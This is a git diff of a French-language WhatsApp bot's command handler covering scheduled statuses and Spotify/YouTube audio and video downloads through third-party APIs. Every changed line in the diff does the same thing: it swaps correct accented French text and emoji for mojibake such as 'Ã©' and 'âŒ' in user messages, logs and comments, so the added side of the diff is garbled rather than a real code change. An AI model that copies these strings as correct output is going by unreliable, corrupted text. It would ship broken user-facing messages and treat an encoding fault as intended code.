-        return send(`❌ Format d'heure non reconnu: "${parts[0]}"\n\n⏰ Formats: 14:30, 14h30, 8:00`);
+        return send(`âŒ Format d'heure non reconnu: "${parts[0]}"\n\nâ° Formats: 14:30, 14h30, 8:00`);
       }
       
       const hours = parseInt(timeMatch[1]);
       const minutes = parseInt(timeMatch[2]);
       
       if (hours < 0 || hours > 23 || minutes < 0 || minutes > 59) {
-        return send(`❌ Heure invalide. Doit être entre 00:00 et 23:59`);
+        return send(`âŒ Heure invalide. Doit Ãªtre entre 00:00 et 23:59`);
       }
       
       // Calculer l'heure d'envoi
@@ -3064,7 +3064,7 @@ async function handleCommand(hani, msg, db) {
         scheduledDate.setDate(scheduledDate.getDate() + 1);
       }
       
-      // Vérifier si c'est une réponse à un média
+      // VÃ©rifier si c'est une rÃ©ponse Ã  un mÃ©dia
       const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
       let statusType = 'text';
       let mediaBuffer = null;
@@ -3074,23 +3074,23 @@ async function handleCommand(hani, msg, db) {
         statusType = 'image';
         try {
           mediaBuffer = await downloadMediaMessage({ message: quotedMsg }, 'buffer');
-          console.log("📸 [STATUS] Image téléchargée pour statut programmé");
+          console.log("ðŸ“¸ [STATUS] Image tÃ©lÃ©chargÃ©e pour statut programmÃ©");
         } catch (e) {
-          return send(`❌ Erreur téléchargement image: ${e.message}`);
+          return send(`âŒ Erreur tÃ©lÃ©chargement image: ${e.message}`);
         }
       } else if (quotedMsg?.videoMessage) {
         statusType = 'video';
         try {
           mediaBuffer = await downloadMediaMessage({ message: quotedMsg }, 'buffer');
-          console.log("🎥 [STATUS] Vidéo téléchargée pour statut programmé");
+          console.log("ðŸŽ¥ [STATUS] VidÃ©o tÃ©lÃ©chargÃ©e pour statut programmÃ©");
         } catch (e) {
-          return send(`❌ Erreur téléchargement vidéo: ${e.message}`);
+          return send(`âŒ Erreur tÃ©lÃ©chargement vidÃ©o: ${e.message}`);
         }
       } else if (!content) {
-        return send(`❌ Tu dois fournir un texte ou répondre à une image/vidéo.\n\n📝 Ex: \`.statusschedule 14:30 Mon message\``);
+        return send(`âŒ Tu dois fournir un texte ou rÃ©pondre Ã  une image/vidÃ©o.\n\nðŸ“ Ex: \`.statusschedule 14:30 Mon message\``);
       }
       
-      // Créer le statut programmé
+      // CrÃ©er le statut programmÃ©
       const statusEntry = {
         id: Date.now(),
         type: statusType,
@@ -3108,22 +3108,22 @@ async function handleCommand(hani, msg, db) {
       scheduledStatus.push(statusEntry);
       startScheduler(hani);
       
-      const typeEmoji = statusType === 'text' ? '📝' : statusType === 'image' ? '🖼️' : '🎥';
+      const typeEmoji = statusType === 'text' ? 'ðŸ“' : statusType === 'image' ? 'ðŸ–¼ï¸' : 'ðŸŽ¥';
       const isToday = scheduledDate.getDate() === now.getDate();
       
-      return send(`📸 *Statut programmé!*\n\n${typeEmoji} *Type:* ${statusType}\n💬 *Contenu:* "${(content || caption || '[Média]').slice(0, 80)}"\n⏰ *Publication:* ${scheduledDate.toLocaleString("fr-FR")}\n📆 ${isToday ? "Aujourd'hui" : "Demain"}\n\n🆔 ID: ${statusEntry.id}\n\n💡 \`.statuslist\` pour voir tous les statuts`);
+      return send(`ðŸ“¸ *Statut programmÃ©!*\n\n${typeEmoji} *Type:* ${statusType}\nðŸ’¬ *Contenu:* "${(content || caption || '[MÃ©dia]').slice(0, 80)}"\nâ° *Publication:* ${scheduledDate.toLocaleString("fr-FR")}\nðŸ“† ${isToday ? "Aujourd'hui" : "Demain"}\n\nðŸ†” ID: ${statusEntry.id}\n\nðŸ’¡ \`.statuslist\` pour voir tous les statuts`);
     }
 
     case "statusrepeat":
     case "repeatstatus":
     case "statutrecurrent": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       // Format: .statusrepeat 08:00 daily Bonjour tout le monde!
       const parts = args?.split(" ") || [];
       
       if (parts.length < 3) {
-        return send(`📸 *STATUT RÉCURRENT*\n\n📋 *Usage:*\n\`.statusrepeat [heure] [fréquence] [texte]\`\n\n📝 *Fréquences:*\n• \`daily\` → Tous les jours\n• \`weekly\` → Chaque semaine\n\n📝 *Exemple:*\n\`.statusrepeat 08:00 daily Bonjour! 🌞\`\n\n_Publie un statut tous les jours à 8h_`);
+        return send(`ðŸ“¸ *STATUT RÃ‰CURRENT*\n\nðŸ“‹ *Usage:*\n\`.statusrepeat [heure] [frÃ©quence] [texte]\`\n\nðŸ“ *FrÃ©quences:*\nâ€¢ \`daily\` â†’ Tous les jours\nâ€¢ \`weekly\` â†’ Chaque semaine\n\nðŸ“ *Exemple:*\n\`.statusrepeat 08:00 daily Bonjour! ðŸŒž\`\n\n_Publie un statut tous les jours Ã  8h_`);
       }
       
       let timeStr = parts[0];
@@ -3131,7 +3131,7 @@ async function handleCommand(hani, msg, db) {
       const content = parts.slice(2).join(" ");
       
       if (!['daily', 'weekly'].includes(repeat)) {
-        return send(`❌ Fréquence invalide.\n\nUtilise: daily ou weekly`);
+        return send(`âŒ FrÃ©quence invalide.\n\nUtilise: daily ou weekly`);
       }
       
       // Normaliser l'heure
@@ -3145,7 +3145,7 @@ async function handleCommand(hani, msg, db) {
       
       const timeMatch = timeStr.match(/^(\d{1,2}):(\d{2})$/);
       if (!timeMatch) {
-        return send(`❌ Format d'heure invalide: "${parts[0]}"`);
+        return send(`âŒ Format d'heure invalide: "${parts[0]}"`);
       }
       
       const hours = parseInt(timeMatch[1]);
@@ -3176,82 +3176,82 @@ async function handleCommand(hani, msg, db) {
       
       const freqLabels = { daily: "Tous les jours", weekly: "Chaque semaine" };
       
-      return send(`📸 *Statut récurrent programmé!*\n\n📝 *Texte:* "${content.slice(0, 80)}"\n⏰ *Heure:* ${parts[0]}\n🔄 *Fréquence:* ${freqLabels[repeat]}\n📆 *Prochain:* ${scheduledDate.toLocaleString("fr-FR")}\n\n🆔 ID: ${statusEntry.id}`);
+      return send(`ðŸ“¸ *Statut rÃ©current programmÃ©!*\n\nðŸ“ *Texte:* "${content.slice(0, 80)}"\nâ° *Heure:* ${parts[0]}\nðŸ”„ *FrÃ©quence:* ${freqLabels[repeat]}\nðŸ“† *Prochain:* ${scheduledDate.toLocaleString("fr-FR")}\n\nðŸ†” ID: ${statusEntry.id}`);
     }
 
     case "statuslist":
     case "liststatus":
     case "statutslist": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       if (scheduledStatus.length === 0) {
-        return send(`📸 *Aucun statut programmé*\n\n💡 Utilise \`.statusschedule [heure] [texte]\` pour en créer`);
+        return send(`ðŸ“¸ *Aucun statut programmÃ©*\n\nðŸ’¡ Utilise \`.statusschedule [heure] [texte]\` pour en crÃ©er`);
       }
       
-      let list = `📸 *STATUTS PROGRAMMÉS (${scheduledStatus.length})*\n\n`;
+      let list = `ðŸ“¸ *STATUTS PROGRAMMÃ‰S (${scheduledStatus.length})*\n\n`;
       
       for (const status of scheduledStatus) {
         const nextSend = new Date(status.scheduledTime).toLocaleString("fr-FR");
-        const typeEmoji = status.type === 'text' ? '📝' : status.type === 'image' ? '🖼️' : '🎥';
-        const statusIcon = status.active ? "✅" : "⏸️";
-        const repeatIcon = status.repeat === 'once' ? "1️⃣" : "🔄";
+        const typeEmoji = status.type === 'text' ? 'ðŸ“' : status.type === 'image' ? 'ðŸ–¼ï¸' : 'ðŸŽ¥';
+        const statusIcon = status.active ? "âœ…" : "â¸ï¸";
+        const repeatIcon = status.repeat === 'once' ? "1ï¸âƒ£" : "ðŸ”„";
         
         list += `${statusIcon} *#${status.id}*\n`;
         list += `${typeEmoji} ${status.type} ${repeatIcon}\n`;
-        list += `💬 "${(status.content || status.caption || '[Média]').slice(0, 40)}..."\n`;
-        list += `⏰ ${nextSend}\n\n`;
+        list += `ðŸ’¬ "${(status.content || status.caption || '[MÃ©dia]').slice(0, 40)}..."\n`;
+        list += `â° ${nextSend}\n\n`;
       }
       
-      list += `💡 \`.statusdel [id]\` pour supprimer`;
+      list += `ðŸ’¡ \`.statusdel [id]\` pour supprimer`;
       return send(list);
     }
 
     case "statusdel":
     case "delstatus":
     case "supprimerstatus": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const statusId = parseInt(args);
       
       if (!statusId) {
-        return send(`❌ *Usage:* \`.statusdel [id]\`\n\n💡 Utilise \`.statuslist\` pour voir les IDs`);
+        return send(`âŒ *Usage:* \`.statusdel [id]\`\n\nðŸ’¡ Utilise \`.statuslist\` pour voir les IDs`);
       }
       
       const index = scheduledStatus.findIndex(s => s.id === statusId);
       
       if (index === -1) {
-        return send(`❌ Statut programmé #${statusId} non trouvé.`);
+        return send(`âŒ Statut programmÃ© #${statusId} non trouvÃ©.`);
       }
       
       const deleted = scheduledStatus[index];
       scheduledStatus.splice(index, 1);
       
-      return send(`🗑️ *Statut programmé supprimé*\n\n🆔 ID: ${deleted.id}\n📝 "${(deleted.content || deleted.caption || '[Média]').slice(0, 50)}..."`);
+      return send(`ðŸ—‘ï¸ *Statut programmÃ© supprimÃ©*\n\nðŸ†” ID: ${deleted.id}\nðŸ“ "${(deleted.content || deleted.caption || '[MÃ©dia]').slice(0, 50)}..."`);
     }
 
     case "statusclear":
     case "clearstatus": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const count = scheduledStatus.length;
       scheduledStatus.length = 0;
       
-      return send(`🗑️ *Tous les statuts programmés supprimés*\n\n📊 ${count} statut(s) effacé(s)`);
+      return send(`ðŸ—‘ï¸ *Tous les statuts programmÃ©s supprimÃ©s*\n\nðŸ“Š ${count} statut(s) effacÃ©(s)`);
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // 🎵 SPOTIFY - Recherche et téléchargement (Multi-API)
-    // ═══════════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // ðŸŽµ SPOTIFY - Recherche et tÃ©lÃ©chargement (Multi-API)
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
     case "spotify":
     case "spotifydl":
     case "spdl":
     case "sp": {
       if (!args) {
-        return send(`🎵 *SPOTIFY*\n\n📋 *Usage:*\n• \`.spotify [titre]\` → Télécharger directement\n• \`.spotify [lien spotify]\` → Télécharger depuis lien\n\n📝 *Exemples:*\n• \`.spotify Rema Calm Down\`\n• \`.spotify Burna Boy City Boys\`\n• \`.spotify https://open.spotify.com/track/...\`\n\n💡 La musique sera téléchargée et envoyée en MP3!`);
+        return send(`ðŸŽµ *SPOTIFY*\n\nðŸ“‹ *Usage:*\nâ€¢ \`.spotify [titre]\` â†’ TÃ©lÃ©charger directement\nâ€¢ \`.spotify [lien spotify]\` â†’ TÃ©lÃ©charger depuis lien\n\nðŸ“ *Exemples:*\nâ€¢ \`.spotify Rema Calm Down\`\nâ€¢ \`.spotify Burna Boy City Boys\`\nâ€¢ \`.spotify https://open.spotify.com/track/...\`\n\nðŸ’¡ La musique sera tÃ©lÃ©chargÃ©e et envoyÃ©e en MP3!`);
       }
       
-      await send("🎵 *Recherche et téléchargement en cours...*\n⏳ _Cela peut prendre quelques secondes..._");
+      await send("ðŸŽµ *Recherche et tÃ©lÃ©chargement en cours...*\nâ³ _Cela peut prendre quelques secondes..._");
       
       try {
         const isSpotifyLink = args.includes("spotify.com") || args.includes("spotify:");
@@ -3260,7 +3260,7 @@ async function handleCommand(hani, msg, db) {
         let audioBuffer = null;
         let success = false;
         
-        // ═══════ API 1: Vreden Spotify ═══════
+        // â•â•â•â•â•â•â• API 1: Vreden Spotify â•â•â•â•â•â•â•
         if (!success) {
           try {
             const searchQuery = isSpotifyLink ? args : encodeURIComponent(args);
@@ -3280,15 +3280,15 @@ async function handleCommand(hani, msg, db) {
                 const audioResp = await fetch(audioUrl);
                 audioBuffer = await audioResp.buffer();
                 success = true;
-                console.log("🎵 [SPOTIFY] API 1 (Vreden) - Succès");
+                console.log("ðŸŽµ [SPOTIFY] API 1 (Vreden) - SuccÃ¨s");
               }
             }
           } catch (e) {
-            console.log("🎵 [SPOTIFY] API 1 échouée:", e.message);
+            console.log("ðŸŽµ [SPOTIFY] API 1 Ã©chouÃ©e:", e.message);
           }
         }
         
-        // ═══════ API 2: Agatz Spotify ═══════
+        // â•â•â•â•â•â•â• API 2: Agatz Spotify â•â•â•â•â•â•â•
         if (!success) {
           try {
             const apiUrl = isSpotifyLink 
@@ -3307,15 +3307,15 @@ async function handleCommand(hani, msg, db) {
                 const audioResp = await fetch(audioUrl);
                 audioBuffer = await audioResp.buffer();
                 success = true;
-                console.log("🎵 [SPOTIFY] API 2 (Agatz) - Succès");
+                console.log("ðŸŽµ [SPOTIFY] API 2 (Agatz) - SuccÃ¨s");
               }
             }
           } catch (e) {
-            console.log("🎵 [SPOTIFY] API 2 échouée:", e.message);
+            console.log("ðŸŽµ [SPOTIFY] API 2 Ã©chouÃ©e:", e.message);
           }
         }
         
-        // ═══════ API 3: Neoxr Spotify ═══════
+        // â•â•â•â•â•â•â• API 3: Neoxr Spotify â•â•â•â•â•â•â•
         if (!success) {
           try {
             const apiUrl = `https://api.neoxr.eu/api/spotify?url=${encodeURIComponent(args)}&apikey=free`;
@@ -3330,15 +3330,15 @@ async function handleCommand(hani, msg, db) {
                 const audioResp = await fetch(data.data.url);
                 audioBuffer = await audioResp.buffer();
                 success = true;
-                console.log("🎵 [SPOTIFY] API 3 (Neoxr) - Succès");
+                console.log("ðŸŽµ [SPOTIFY] API 3 (Neoxr) - SuccÃ¨s");
               }
             }
           } catch (e) {
-            console.log("🎵 [SPOTIFY] API 3 échouée:", e.message);
+            console.log("ðŸŽµ [SPOTIFY] API 3 Ã©chouÃ©e:", e.message);
           }
         }
         
-        // ═══════ API 4: Nyxs Spotify ═══════
+        // â•â•â•â•â•â•â• API 4: Nyxs Spotify â•â•â•â•â•â•â•
         if (!success) {
           try {
             const apiUrl = `https://api.nyxs.pw/dl/spotify?url=${encodeURIComponent(args)}`;
@@ -3353,18 +3353,18 @@ async function handleCommand(hani, msg, db) {
                 const audioResp = await fetch(data.result.url);
                 audioBuffer = await audioResp.buffer();
                 success = true;
-                console.log("🎵 [SPOTIFY] API 4 (Nyxs) - Succès");
+                console.log("ðŸŽµ [SPOTIFY] API 4 (Nyxs) - SuccÃ¨s");
               }
             }
           } catch (e) {
-            console.log("🎵 [SPOTIFY] API 4 échouée:", e.message);
+            console.log("ðŸŽµ [SPOTIFY] API 4 Ã©chouÃ©e:", e.message);
           }
         }
         
-        // ═══════ FALLBACK: YouTube Search + Download ═══════
+        // â•â•â•â•â•â•â• FALLBACK: YouTube Search + Download â•â•â•â•â•â•â•
         if (!success && !isSpotifyLink) {
           try {
-            await send("🔄 *Recherche via YouTube...*");
+            await send("ðŸ”„ *Recherche via YouTube...*");
             
             // Recherche YouTube
             const ytSearchUrl = `https://api.agatz.xyz/api/ytsearch?query=${encodeURIComponent(args)}`;
@@ -3375,7 +3375,7 @@ async function handleCommand(hani, msg, db) {
               const firstResult = searchData.data[0];
               trackTitle = firstResult.title || args;
               
-              // Télécharger depuis YouTube
+              // TÃ©lÃ©charger depuis YouTube
               const ytDlUrl = `https://api.agatz.xyz/api/ytdl?url=${encodeURIComponent(firstResult.url)}&type=audio`;
               const dlResp = await fetch(ytDlUrl, { timeout: 30000 });
               const dlData = await dlResp.json();
@@ -3384,18 +3384,18 @@ async function handleCommand(hani, msg, db) {
                 const audioResp = await fetch(dlData.data.url);
                 audioBuffer = await audioResp.buffer();
                 success = true;
-                console.log("🎵 [SPOTIFY] Fallback YouTube - Succès");
+                console.log("ðŸŽµ [SPOTIFY] Fallback YouTube - SuccÃ¨s");
               }
             }
           } catch (e) {
-            console.log("🎵 [SPOTIFY] Fallback YouTube échoué:", e.message);
+            console.log("ðŸŽµ [SPOTIFY] Fallback YouTube Ã©chouÃ©:", e.message);
           }
         }
         
-        // ═══════ ENVOYER L'AUDIO ═══════
+        // â•â•â•â•â•â•â• ENVOYER L'AUDIO â•â•â•â•â•â•â•
         if (success && audioBuffer) {
           // Envoyer les infos
-          const infoMsg = `🎵 *${trackTitle}*${trackArtist ? `\n👤 ${trackArtist}` : ''}`;
+          const infoMsg = `ðŸŽµ *${trackTitle}*${trackArtist ? `\nðŸ‘¤ ${trackArtist}` : ''}`;
           await send(infoMsg);
           
           // Envoyer l'audio
@@ -3408,12 +3408,12 @@ async function handleCommand(hani, msg, db) {
           return;
         }
         
-        // Si rien n'a fonctionné
-        return send(`❌ *Impossible de télécharger cette musique*\n\n💡 *Essaie:*\n• Vérifie le titre/lien\n• \`.play ${args}\` (via YouTube)\n• \`.song ${args}\` (alternative)`);
+        // Si rien n'a fonctionnÃ©
+        return send(`âŒ *Impossible de tÃ©lÃ©charger cette musique*\n\nðŸ’¡ *Essaie:*\nâ€¢ VÃ©rifie le titre/lien\nâ€¢ \`.play ${args}\` (via YouTube)\nâ€¢ \`.song ${args}\` (alternative)`);
         
       } catch (e) {
-        console.log("🎵 [SPOTIFY] Erreur globale:", e.message);
-        return send(`❌ Erreur: ${e.message}\n\n💡 Essaie \`.play ${args}\` en alternative`);
+        console.log("ðŸŽµ [SPOTIFY] Erreur globale:", e.message);
+        return send(`âŒ Erreur: ${e.message}\n\nðŸ’¡ Essaie \`.play ${args}\` en alternative`);
       }
     }
 
@@ -3421,10 +3421,10 @@ async function handleCommand(hani, msg, db) {
     case "spotifysearch":
     case "searchspotify": {
       if (!args) {
-        return send(`🔍 *RECHERCHE SPOTIFY*\n\n📋 *Usage:*\n\`.spsearch [titre ou artiste]\`\n\n📝 *Exemple:*\n\`.spsearch Burna Boy\`\n\`.spsearch Rema\``);
+        return send(`ðŸ” *RECHERCHE SPOTIFY*\n\nðŸ“‹ *Usage:*\n\`.spsearch [titre ou artiste]\`\n\nðŸ“ *Exemple:*\n\`.spsearch Burna Boy\`\n\`.spsearch Rema\``);
       }
       
-      await send("🔍 *Recherche Spotify en cours...*");
+      await send("ðŸ” *Recherche Spotify en cours...*");
       
       try {
         let results = "";
@@ -3437,22 +3437,22 @@ async function handleCommand(hani, msg, db) {
           const data = await response.json();
           
           if (data.status === 200 && data.data && data.data.length > 0) {
-            results = `🎵 *Résultats Spotify: "${args}"*\n\n`;
+            results = `ðŸŽµ *RÃ©sultats Spotify: "${args}"*\n\n`;
             
             const tracks = data.data.slice(0, 6);
             for (let i = 0; i < tracks.length; i++) {
               const t = tracks[i];
               results += `${i + 1}. *${t.title || t.name || 'Sans titre'}*\n`;
-              results += `   👤 ${t.artist || t.artists || 'Inconnu'}\n`;
-              if (t.duration) results += `   ⏱️ ${t.duration}\n`;
+              results += `   ðŸ‘¤ ${t.artist || t.artists || 'Inconnu'}\n`;
+              if (t.duration) results += `   â±ï¸ ${t.duration}\n`;
               results += `\n`;
             }
             
-            results += `💡 *Pour télécharger:*\n\`.spotify [titre exact]\``;
+            results += `ðŸ’¡ *Pour tÃ©lÃ©charger:*\n\`.spotify [titre exact]\``;
             found = true;
           }
         } catch (e) {
-          console.log("Recherche API 1 échouée:", e.message);
+          console.log("Recherche API 1 Ã©chouÃ©e:", e.message);
         }
         
         // Fallback: YouTube Search
@@ -3463,21 +3463,21 @@ async function handleCommand(hani, msg, db) {
             const data = await response.json();
             
             if (data.status === 200 && data.data && data.data.length > 0) {
-              results = `🎵 *Résultats pour "${args}"*\n_(via YouTube)_\n\n`;
+              results = `ðŸŽµ *RÃ©sultats pour "${args}"*\n_(via YouTube)_\n\n`;
               
               const tracks = data.data.slice(0, 5);
               for (let i = 0; i < tracks.length; i++) {
                 const t = tracks[i];
                 results += `${i + 1}. *${t.title}*\n`;
-                if (t.duration) results += `   ⏱️ ${t.duration}\n`;
+                if (t.duration) results += `   â±ï¸ ${t.duration}\n`;
                 results += `\n`;
               }
               
-              results += `💡 *Pour télécharger:*\n\`.spotify [titre]\` ou \`.play [titre]\``;
+              results += `ðŸ’¡ *Pour tÃ©lÃ©charger:*\n\`.spotify [titre]\` ou \`.play [titre]\``;
               found = true;
             }
           } catch (e) {
-            console.log("Recherche YouTube échouée:", e.message);
+            console.log("Recherche YouTube Ã©chouÃ©e:", e.message);
           }
         }
         
@@ -3485,23 +3485,23 @@ async function handleCommand(hani, msg, db) {
           return send(results);
         }
         
-        return send(`❌ Aucun résultat pour "${args}"\n\n💡 Essaie avec d'autres mots-clés`);
+        return send(`âŒ Aucun rÃ©sultat pour "${args}"\n\nðŸ’¡ Essaie avec d'autres mots-clÃ©s`);
         
       } catch (e) {
-        return send(`❌ Erreur: ${e.message}`);
+        return send(`âŒ Erreur: ${e.message}`);
       }
     }
 
     case "song":
     case "music":
     case "chanson": {
-      // Alias pour play (télécharge l'audio depuis YouTube)
+      // Alias pour play (tÃ©lÃ©charge l'audio depuis YouTube)
       if (!args) {
-        return send(`🎵 *MUSIQUE*\n\n📋 *Usage:*\n\`.song [titre]\`\n\n📝 *Exemple:*\n\`.song Rema Calm Down\``);
+        return send(`ðŸŽµ *MUSIQUE*\n\nðŸ“‹ *Usage:*\n\`.song [titre]\`\n\nðŸ“ *Exemple:*\n\`.song Rema Calm Down\``);
       }
       
-      // Exécuter la même logique que play
-      await send("🎵 *Recherche de la musique...*\n⏳ _Patiente quelques secondes..._");
+      // ExÃ©cuter la mÃªme logique que play
+      await send("ðŸŽµ *Recherche de la musique...*\nâ³ _Patiente quelques secondes..._");
       
       try {
         let audioBuffer = null;
@@ -3522,7 +3522,7 @@ async function handleCommand(hani, msg, db) {
             }
           }
         } catch (e) {
-          console.log("[SONG] API 1 échouée:", e.message);
+          console.log("[SONG] API 1 Ã©chouÃ©e:", e.message);
         }
         
         // API 2: Alternative avec ytdl
@@ -3547,7 +3547,7 @@ async function handleCommand(hani, msg, db) {
               }
             }
           } catch (e) {
-            console.log("[SONG] API 2 échouée:", e.message);
+            console.log("[SONG] API 2 Ã©chouÃ©e:", e.message);
           }
         }
         
@@ -3559,27 +3559,27 @@ async function handleCommand(hani, msg, db) {
             fileName: `${trackInfo.title}.mp3`
           }, { quoted: msg });
           
-          return send(`🎵 *${trackInfo.title}*\n\n✅ Téléchargement terminé!\n🔊 *Powered by HANI-MD*`);
+          return send(`ðŸŽµ *${trackInfo.title}*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ”Š *Powered by HANI-MD*`);
         }
         
-        return send(`❌ Impossible de télécharger "${args}"\n\n💡 Essaie avec un autre titre`);
+        return send(`âŒ Impossible de tÃ©lÃ©charger "${args}"\n\nðŸ’¡ Essaie avec un autre titre`);
         
       } catch (e) {
-        return send(`❌ Erreur: ${e.message}`);
+        return send(`âŒ Erreur: ${e.message}`);
       }
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // 📥 TÉLÉCHARGEMENT YOUTUBE - Audio & Vidéo
-    // ═══════════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // ðŸ“¥ TÃ‰LÃ‰CHARGEMENT YOUTUBE - Audio & VidÃ©o
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
     case "play":
     case "ytmp3": {
       if (!args) {
-        return send(`🎵 *TÉLÉCHARGER AUDIO YOUTUBE*\n\n📋 *Usage:*\n\`.play [titre ou lien YouTube]\`\n\n📝 *Exemples:*\n\`.play Rema Calm Down\`\n\`.play https://youtube.com/watch?v=...\`\n\n🔊 Télécharge l'audio en MP3!`);
+        return send(`ðŸŽµ *TÃ‰LÃ‰CHARGER AUDIO YOUTUBE*\n\nðŸ“‹ *Usage:*\n\`.play [titre ou lien YouTube]\`\n\nðŸ“ *Exemples:*\n\`.play Rema Calm Down\`\n\`.play https://youtube.com/watch?v=...\`\n\nðŸ”Š TÃ©lÃ©charge l'audio en MP3!`);
       }
       
-      await send("🎵 *Téléchargement audio en cours...*\n⏳ _Patiente quelques secondes..._");
+      await send("ðŸŽµ *TÃ©lÃ©chargement audio en cours...*\nâ³ _Patiente quelques secondes..._");
       
       try {
         const isYouTubeLink = args.includes("youtube.com") || args.includes("youtu.be");
@@ -3603,7 +3603,7 @@ async function handleCommand(hani, msg, db) {
               }
             }
           } catch (e) {
-            console.log("[PLAY] API Vreden échouée:", e.message);
+            console.log("[PLAY] API Vreden Ã©chouÃ©e:", e.message);
           }
           
           // API 2: Agatz
@@ -3621,7 +3621,7 @@ async function handleCommand(hani, msg, db) {
                 }
               }
             } catch (e) {
-              console.log("[PLAY] API Agatz échouée:", e.message);
+              console.log("[PLAY] API Agatz Ã©chouÃ©e:", e.message);
             }
           }
         } else {
@@ -3637,7 +3637,7 @@ async function handleCommand(hani, msg, db) {
               trackInfo.title = video.title || args;
               trackInfo.thumbnail = video.thumbnail || "";
               
-              // Télécharger l'audio
+              // TÃ©lÃ©charger l'audio
               const dlUrl = `https://api.vrfrnd.xyz/api/ytmp3?url=${encodeURIComponent(video.url)}`;
               const dlResp = await fetch(dlUrl, { timeout: 25000 });
               const dlData = await dlResp.json();
@@ -3648,7 +3648,7 @@ async function handleCommand(hani, msg, db) {
               }
             }
           } catch (e) {
-            console.log("[PLAY] Recherche échouée:", e.message);
+            console.log("[PLAY] Recherche Ã©chouÃ©e:", e.message);
           }
           
           // API alternative pour recherche
@@ -3666,7 +3666,7 @@ async function handleCommand(hani, msg, db) {
                 }
               }
             } catch (e) {
-              console.log("[PLAY] API itzpire échouée:", e.message);
+              console.log("[PLAY] API itzpire Ã©chouÃ©e:", e.message);
             }
           }
         }
@@ -3677,7 +3677,7 @@ async function handleCommand(hani, msg, db) {
             try {
               await hani.sendMessage(from, {
                 image: { url: trackInfo.thumbnail },
-                caption: `🎵 *${trackInfo.title}*\n\n⏳ Envoi de l'audio...`
+                caption: `ðŸŽµ *${trackInfo.title}*\n\nâ³ Envoi de l'audio...`
               }, { quoted: msg });
             } catch (e) {}
           }
@@ -3689,23 +3689,23 @@ async function handleCommand(hani, msg, db) {
             fileName: `${trackInfo.title}.mp3`
           }, { quoted: msg });
           
-          return send(`✅ *Téléchargement terminé!*\n🔊 *Powered by HANI-MD*`);
+          return send(`âœ… *TÃ©lÃ©chargement terminÃ©!*\nðŸ”Š *Powered by HANI-MD*`);
         }
         
-        return send(`❌ Impossible de télécharger "${args}"\n\n💡 Vérifie le lien ou le titre`);
+        return send(`âŒ Impossible de tÃ©lÃ©charger "${args}"\n\nðŸ’¡ VÃ©rifie le lien ou le titre`);
         
       } catch (e) {
-        return send(`❌ Erreur: ${e.message}`);
+        return send(`âŒ Erreur: ${e.message}`);
       }
     }
 
     case "video":
     case "ytmp4": {
       if (!args) {
-        return send(`🎬 *TÉLÉCHARGER VIDÉO YOUTUBE*\n\n📋 *Usage:*\n\`.video [titre ou lien YouTube]\`\n\n📝 *Exemples:*\n\`.video Rema Calm Down\`\n\`.video https://youtube.com/watch?v=...\`\n\n📹 Télécharge la vidéo en MP4!`);
+        return send(`ðŸŽ¬ *TÃ‰LÃ‰CHARGER VIDÃ‰O YOUTUBE*\n\nðŸ“‹ *Usage:*\n\`.video [titre ou lien YouTube]\`\n\nðŸ“ *Exemples:*\n\`.video Rema Calm Down\`\n\`.video https://youtube.com/watch?v=...\`\n\nðŸ“¹ TÃ©lÃ©charge la vidÃ©o en MP4!`);
       }
       
-      await send("🎬 *Téléchargement vidéo en cours...*\n⏳ _Patiente quelques secondes..._");
+      await send("ðŸŽ¬ *TÃ©lÃ©chargement vidÃ©o en cours...*\nâ³ _Patiente quelques secondes..._");
       
       try {
         const isYouTubeLink = args.includes("youtube.com") || args.includes("youtu.be");
@@ -3728,7 +3728,7 @@ async function handleCommand(hani, msg, db) {
               }
             }
           } catch (e) {
-            console.log("[VIDEO] API 1 échouée:", e.message);
+            console.log("[VIDEO] API 1 Ã©chouÃ©e:", e.message);
           }
           
           // API 2: Agatz
@@ -3746,7 +3746,7 @@ async function handleCommand(hani, msg, db) {
                 }
               }
             } catch (e) {
-              console.log("[VIDEO] API 2 échouée:", e.message);
+              console.log("[VIDEO] API 2 Ã©chouÃ©e:", e.message);
             }
           }
         } else {
@@ -3770,7 +3770,7 @@ async function handleCommand(hani, msg, db) {
               }
             }
           } catch (e) {
-            console.log("[VIDEO] Recherche échouée:", e.message);
+            console.log("[VIDEO] Recherche Ã©chouÃ©e:", e.message);
           }
         }
         
@@ -3778,36 +3778,36 @@ async function handleCommand(hani, msg, db) {
           await hani.sendMessage(from, {
             video: videoBuffer,
             mimetype: "video/mp4",
-            caption: `🎬 *${trackInfo.title}*\n\n✅ Téléchargement terminé!\n📹 *Powered by HANI-MD*`,
+            caption: `ðŸŽ¬ *${trackInfo.title}*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ“¹ *Powered by HANI-MD*`,
             fileName: `${trackInfo.title}.mp4`
           }, { quoted: msg });
           
           return;
         }
         
